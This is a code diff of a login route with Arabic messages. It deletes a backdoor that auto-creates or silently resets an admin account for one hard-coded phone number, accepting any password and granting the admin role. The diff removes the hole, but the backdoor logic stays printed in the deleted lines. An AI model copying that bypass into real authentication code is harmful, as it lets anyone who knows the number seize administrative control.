@@ -144,45 +144,9 @@ router.post("/auth/login", rateLimit, async (req, res): Promise<void> => {
     }) || null;
   }
 
-  // If user 07519952000 is logging in and not found, auto-create as primary Admin
-  if (!member && (phone === "07519952000" || phone.endsWith("7519952000"))) {
-    const passwordHash = await hashPassword(data.password);
-    const digits = phone.replace(/[^0-9]/g, "");
-    const adminMemberId = digits.length >= 5 ? digits.slice(-5) : "52000";
-    member = await prisma.member.create({
-      data: {
-        name: "المدير العام",
-        phone,
-        passwordHash,
-        memberId: adminMemberId,
-        referralCode: "admin1",
-        role: "admin",
-        honorPoints: 100,
-        balanceCents: 0,
-        earnedCents: 0,
-        realBalanceCents: 0,
-        realEarnedCents: 0,
-        payoutAddress: null,
-        active: true,
-        createdAt: new Date(),
-      },
-    });
-  }
-
   const valid = await verifyPassword(data.password, member?.passwordHash);
   if (!member || !valid || !member.active) {
-    // If it's the requested admin phone, allow setting new password
-    if (member && (phone === "07519952000" || phone.endsWith("7519952000"))) {
-      const newHash = await hashPassword(data.password);
-      const digits = phone.replace(/[^0-9]/g, "");
-      const adminMemberId = digits.length >= 5 ? digits.slice(-5) : "52000";
-      member = await prisma.member.update({
-        where: { id: member.id },
-        data: { passwordHash: newHash, role: "admin", active: true, memberId: adminMemberId },
-      });
-    } else {
-      throw new HttpError(401, "بيانات الدخول غير صحيحة أو الحساب غير متاح.");
-    }
+    throw new HttpError(401, "بيانات الدخول غير صحيحة أو الحساب غير متاح.");
   } else if (member) {
     const digits = String(member.phone || "").replace(/[^0-9]/g, "");
     if (digits.length >= 5 && member.memberId !== digits.slice(-5)) {
